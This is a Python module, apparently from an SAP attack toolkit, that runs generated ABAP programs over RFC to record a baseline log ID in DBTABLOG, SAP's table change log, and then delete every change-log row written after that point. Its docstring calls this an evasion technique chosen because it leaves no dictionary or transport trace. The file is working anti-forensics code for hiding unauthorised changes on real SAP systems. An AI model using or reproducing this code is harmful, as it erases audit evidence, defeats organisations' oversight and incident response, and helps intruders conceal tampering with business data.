#!/usr/bin/env python3
"""DBTABLOG post-hoc purge — Tier 3 evasion technique (Approach C).

Strategy: do NOT block the kernel's logging path (which would require
DD09L mutation + DDIF_TABL_ACTIVATE — loud, transport-tracked, dictionary
brick risk).  Instead let logging proceed normally during the hold
window, then surgically delete the rows we wrote.

Why this is safe:
  * DBTABLOG is delivery class ``L`` (log table) and is itself NOT
    registered for change logging — deletes do not recurse (see SAP
    error message DT 755).
  * Comparison field ``LOGID`` is a CHAR-like string whose lexical
    ordering equals temporal ordering, so ``WHERE LOGID > '<baseline>'``
    catches exactly the rows written after the baseline read, on every
    DB backend.
  * No DDIC mutation, no DD09L touch, no transport object created.

Delivery: ``RFC_ABAP_INSTALL_AND_RUN`` with a throwaway 5-line program.
Goes through the ABAP DB interface — same layer that wrote the entries
in the first place.  No TADIR entry (the generated program is executed
and discarded).
"""

from __future__ import annotations

import logging
import re
from typing import Iterable, Optional

logger = logging.getLogger(__name__)

# Hard ceiling on tabname filter size — keeps the generated ABAP under
# the RFC_ABAP_INSTALL_AND_RUN program-line budget and avoids silently
# clipping operator intent.
_MAX_TABNAMES = 32


def _build_purge_abap(baseline_logid: str,
                       tabname_filter: Optional[Iterable[str]] = None
                       ) -> list:
    """Return ABAP source lines for the DELETE program.

    The program:
      1. DELETEs DBTABLOG rows with LOGID > baseline (optionally
         narrowed by a tabname IN range).
      2. WRITEs ``DELETED|<sy-dbcnt>`` and ``REMAINING|<count>``
         for caller-side parsing.
    """
    # Single-quote escape — LOGID values from the DB are alnum (no
    # quotes), but a paranoid escape costs nothing and guards against
    # a future LOGID format shift.
    safe_base = baseline_logid.replace("'", "''")

    lines = [
        "REPORT zsapmap_dbpurge LINE-SIZE 1023.",
        f"DATA: lv_base TYPE dbtablog-logid VALUE '{safe_base}'.",
        "DATA: lv_rem TYPE i.",
    ]

    tabs = list(tabname_filter or [])
    if tabs:
        if len(tabs) > _MAX_TABNAMES:
            raise ValueError(
                f"tabname_filter has {len(tabs)} entries; "
                f"max is {_MAX_TABNAMES}")
        lines.append(
            "DATA: lr_tabs TYPE RANGE OF dbtablog-tabname,")
        lines.append(
            "      ls_tab LIKE LINE OF lr_tabs.")
        lines.append("ls_tab-sign = 'I'. ls_tab-option = 'EQ'.")
        for tab in tabs:
            # Uppercase + strip whitespace; ABAP table names are
            # uppercase by convention.
            safe_tab = tab.strip().upper().replace("'", "''")
            if not re.match(r"^[A-Z0-9_/]{1,30}$", safe_tab):
                raise ValueError(f"invalid tabname: {tab!r}")
            lines.append(
                f"ls_tab-low = '{safe_tab}'. APPEND ls_tab TO lr_tabs.")
        lines.append(
            "DELETE FROM dbtablog "
            "WHERE logid > lv_base AND tabname IN lr_tabs.")
        lines.append("WRITE: / 'DELETED|', sy-dbcnt.")
        lines.append("COMMIT WORK.")
        lines.append(
            "SELECT COUNT(*) FROM dbtablog "
            "INTO lv_rem "
            "WHERE logid > lv_base AND tabname IN lr_tabs.")
    else:
        lines.append(
            "DELETE FROM dbtablog WHERE logid > lv_base.")
        lines.append("WRITE: / 'DELETED|', sy-dbcnt.")
        lines.append("COMMIT WORK.")
        lines.append(
            "SELECT COUNT(*) FROM dbtablog "
            "INTO lv_rem WHERE logid > lv_base.")

    lines.append("WRITE: / 'REMAINING|', lv_rem.")
    return lines


def _build_max_logid_abap() -> list:
    """ABAP that emits ``MAXLOGID|<value>`` or ``MAXLOGID|`` (empty)."""
    return [
        "REPORT zsapmap_dbmaxid LINE-SIZE 1023.",
        "DATA: lv_max TYPE dbtablog-logid.",
        "SELECT MAX( logid ) FROM dbtablog INTO lv_max.",
        "WRITE: / 'MAXLOGID|', lv_max.",
    ]


def _parse_kv_line(lines: list, key: str) -> Optional[str]:
    """Pull the ``KEY|<value>`` line from a WRITE output list."""
    needle = key + "|"
    for line in lines:
        s = (line or "").strip()
        if s.startswith(needle):
            return s[len(needle):].strip()
        # ABAP WRITE: / 'KEY|', val   may render as 'KEY|        12'
        # (with a gap before the value).  Match that too.
        m = re.match(rf"^{re.escape(key)}\|\s*(.*)$", s)
        if m:
            return m.group(1).strip()
    return None


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def read_max_logid(node, creds=None) -> dict:
    """Read ``MAX(LOGID) FROM DBTABLOG`` via RFC_ABAP_INSTALL_AND_RUN.

    Returns ``{ok, baseline, raw, error}`` — ``baseline`` is the
    string LOGID (may be empty if DBTABLOG is empty).
    """
    import sapmap_rfc
    result = {"ok": False, "baseline": "", "raw": [], "error": ""}
    abap = _build_max_logid_abap()
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            run = sapmap_rfc._run_abap_program(conn, abap,
                                                 "ZSAPMAP_DBMAXID")
    except Exception as e:
        from sapmap_errors import format_rfc_exception
        result["error"] = format_rfc_exception(e)[:200]
        return result

    result["raw"] = run.get("output") or []
    if not run.get("success"):
        result["error"] = (run.get("error") or "RFC_ABAP_INSTALL_AND_RUN failed")[:200]
        return result

    val = _parse_kv_line(result["raw"], "MAXLOGID")
    if val is None:
        result["error"] = (
            f"MAXLOGID marker missing from output: "
            f"{result['raw'][:3]}")
        return result
    result["baseline"] = val
    result["ok"] = True
    return result


def purge_dbtablog(node, baseline_logid: str,
                    tabname_filter: Optional[Iterable[str]] = None,
                    creds=None) -> dict:
    """Delete DBTABLOG entries with ``LOGID > baseline_logid``.

    Returns ``{ok, deleted_count, remaining_count, raw, error}``.
    ``remaining_count`` should be 0 on success — non-zero means the
    DELETE didn't authorize or the WHERE clause didn't match.
    """
    import sapmap_rfc
    result = {"ok": False, "deleted_count": 0, "remaining_count": -1,
              "raw": [], "error": ""}

    try:
        abap = _build_purge_abap(baseline_logid, tabname_filter)
    except ValueError as e:
        result["error"] = str(e)
        return result

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            run = sapmap_rfc._run_abap_program(conn, abap,
                                                 "ZSAPMAP_DBPURGE")
    except Exception as e:
        from sapmap_errors import format_rfc_exception
        result["error"] = format_rfc_exception(e)[:200]
        return result

    result["raw"] = run.get("output") or []
    if not run.get("success"):
        result["error"] = (run.get("error") or "RFC_ABAP_INSTALL_AND_RUN failed")[:200]
        return result

    deleted_s = _parse_kv_line(result["raw"], "DELETED")
    remaining_s = _parse_kv_line(result["raw"], "REMAINING")
    try:
        result["deleted_count"] = int(deleted_s) if deleted_s else 0
    except ValueError:
        result["error"] = f"non-int DELETED value: {deleted_s!r}"
        return result
    try:
        result["remaining_count"] = (
            int(remaining_s) if remaining_s is not None else -1)
    except ValueError:
        result["error"] = f"non-int REMAINING value: {remaining_s!r}"
        return result

    if result["remaining_count"] > 0:
        result["error"] = (
            f"DELETE incomplete — {result['remaining_count']} row(s) "
            f"with LOGID > baseline remain (auth check on DBTABLOG?)")
        return result

    result["ok"] = True
    return result
